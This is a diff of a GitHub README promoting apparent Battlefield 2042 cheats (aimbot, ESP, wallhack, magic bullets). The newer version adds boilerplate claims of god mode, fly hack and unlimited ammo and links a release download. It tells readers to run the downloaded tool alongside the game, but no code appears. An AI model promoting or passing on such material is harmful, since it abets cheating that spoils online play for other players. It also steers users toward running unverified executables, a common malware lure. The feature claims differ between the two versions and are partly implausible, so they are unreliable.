@@ -1,67 +1,101 @@
-![5JoDhCG](https://github.com/user-attachments/assets/aae4c6c9-bbd3-40fa-8073-2c97e4305a5a)
+```markdown
+# 🎮 BF2042 Baunti Aimbot, ESP, and Misc Hacks
 
-# 📁 [DOWNLOAD](https://github.com/LegendProjectX/BF2042-Baunti-Aimbot-ESP-Misc/releases/download/Baunti/Baunti.zip)
+Welcome to the BF2042 Baunti repository! This project focuses on enhancing your gameplay experience in **Battlefield 2042** through various hacks. Whether you're looking to improve your aim, gain visibility through walls, or add other useful features, you are in the right place.
 
+## 🚀 Features
 
-# ⚙️ Functions
-## ESP
-- Draw Boxes / Show boxes around players
-- Health / Show health
-- Names / Show names
-- Weapon / Show weapons
-- Distance / Show distance to players
-- Skeleton / Show skeletons on players
-- Vehicle Name / Show vehicle names
-- Vehicle Skeleton / Show vehicle skeleton
-- Show Teammates / Show players on your team
-- Weapon Lines / Show lines to weapons
-- Explosives / Show explosives
-- Grenades / Show grenades
-- Bullets / Show ammo
-- Supply Packs / Show supply packs
-- Pickups / Show pickups
-- Empty Vehicles / Show empty vehicles
-- Soldier Hitboxes / Show soldier hitboxes
-- Max Drawing Distance / Change display distance
-## AIMBOT
-- Aimbot / Enable aimbot
-- AIm At Vehicles / Enable aimbot on equipment
-- Visibility Check / The aimbot will only work on those in the line of sight
-- Auto Fire / Automatic shooting
-- Random Bone / The aimbot will work on different parts of the body
-- Select Aiming Key / Set a key for the aimbot
-- Aimbot Bone / Select a body part for the aimbot
-- Aimbot Mode / Change the type of aimbot
-- Aimbot FOV / Change the radius of the aimbot
-- Aimbot World Distance / Change the range of the aimbot
-- Aim Lock / The aimbot will be locked on the target until the enemy is destroyed
-- Smooth Aim / Change the smoothness of the aimbot
-- Dont Aim At Land Vehicles / The aimbot will not work on ground vehicles
-## INFO
-- Proximity Warning / Informing that the enemy is nearby
-- Radar / Display radar
-## MISC
-- No Recoil [client-side, low distance only] / Enable recoil disabling [use only at low distances]
-- Magic Bullets / Enable hitting enemies without direct aim on a body part
-- Magic Bullet Headshots / Enable hitting enemies without direct aim directly in the head
-- Auto Knife / Automatic knife activation
-- Knife Delay / Delay of knife strike
-- No Smoke / Disable smoke from smoke grenades
-- Unlock Vehicle FOV / Change the viewing angle while in a vehicle
-# VISUALS AND SETTINGS
-- Invisible Enemy Color / Change the color of enemies that are not in the line of sight
-- Visible Enemy Color / Change the color of enemies that are in the line of sight
-- Invisible Bot Enemy Color / Change the color of bots that are not in the line of sight
-- Visible Bot Enemy Color / Change the color of bots that are in the line of sight
-- Teammate Color / Change the color of your team's players
-- Explosives / Change the color of explosives
-- Grenades / Change the color of grenades
-- Bullets Color / Change the color of the display cartridge
-- Supply Packs / Change the display color of supply packs
-- Health Packs Color / Change the display color of medical boxes
-- Weapon Pickups Color / Change the display color of weapon boxes
-- Empty Vehicles Color / Change the display color of empty vehicles
+- **Aimbot**: Improve your accuracy and take down opponents effortlessly.
+- **ESP (Extra Sensory Perception)**: See enemy locations and items through walls.
+- **Wallhack**: Gain the advantage by spotting foes before they can spot you.
+- **Fly Hack**: Experience the freedom to fly above the battlefield.
+- **God Mode**: Become invincible and dominate the game.
+- **Invisible Hack**: Move around undetected by enemies.
+- **Radar Hack**: Keep track of enemy movements in real time.
+- **Unlimited Ammo**: Never run out of ammunition in the heat of battle.
+- **Hack Menu**: Access a user-friendly interface to toggle hacks on or off.
+- **Hack Script**: Implement custom scripts for tailored gameplay experiences.
 
-# Screenshots
-![uIiZlH1](https://github.com/user-attachments/assets/f97be771-9a6f-40f3-9f01-26d673e2524f)
-![TTyY2C5](https://github.com/user-attachments/assets/b02cc19f-e62d-495a-84bf-96b46b69ce52)
+## 📦 Installation
+
+To get started with the hacks, download the latest version from the Releases section. 
+
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/M4ick0lWj/BF2042-Baunti-Aimbot-ESP-Misc/releases)
+
+After downloading, execute the files as instructed in the documentation provided within the release.
+
+## ⚙️ Usage
+
+Once you have installed the hacks:
+
+1. Launch **Battlefield 2042**.
+2. Run the downloaded hack tool.
+3. Use the designated hotkeys to activate your preferred hacks.
+4. Enjoy your enhanced gaming experience!
+
+## 🛠️ Topics
+
+This repository covers a wide array of topics that may interest you:
+
+- battlefield-2042-esp-hack
+- battlefield-2042-fly-hack
+- battlefield-2042-god-mode
+- battlefield-2042-hack-injector
+- battlefield-2042-hack-menu
+- battlefield-2042-hack-script
+- battlefield-2042-hack-tool
+- battlefield-2042-invisible-hack
+- battlefield-2042-radar-hack
+- battlefield-2042-unlimited-ammo
+- bf2042-aim
+- bf2042-esp
+- bf2042-hack
+- bf2042-hack-aim
+- bf2042-hacks
+- bf2042-legit
+
+## 🤝 Contribution
+
+We welcome contributions from the community! If you have suggestions, improvements, or additional hacks, feel free to fork the repository and submit a pull request.
+
+### How to Contribute
+
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request detailing your changes and their benefits.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for more information.
+
+## ❓ Frequently Asked Questions
+
+### Is this hack safe to use?
+
+Using hacks may violate the terms of service for **Battlefield 2042**. Always consider the risks involved in using hacks and cheats.
+
+### Will I get banned for using this?
+
+There is always a risk of being banned when using hacks. Use at your own discretion.
+
+### Can I use these hacks offline?
+
+Some hacks may work offline, but features like ESP and Radar may require online gameplay.
+
+## 🌐 Community
+
+Join our community to share your experiences, tips, and tricks. Connect with other players and discuss strategies to maximize your enjoyment of **Battlefield 2042**. 
+
+## 📣 Acknowledgments
+
+Thanks to all contributors and the community for your support and enthusiasm. Your input drives the development of this project.
+
+## 📥 Contact
+
+For any questions or issues, please reach out through GitHub issues, and we’ll do our best to assist you.
+
+---
+
+This README serves as your comprehensive guide to the **BF2042 Baunti Aimbot, ESP, and Misc Hacks**. Enjoy your time in **Battlefield 2042** with these tools at your disposal. Play smart, and stay safe!
+```
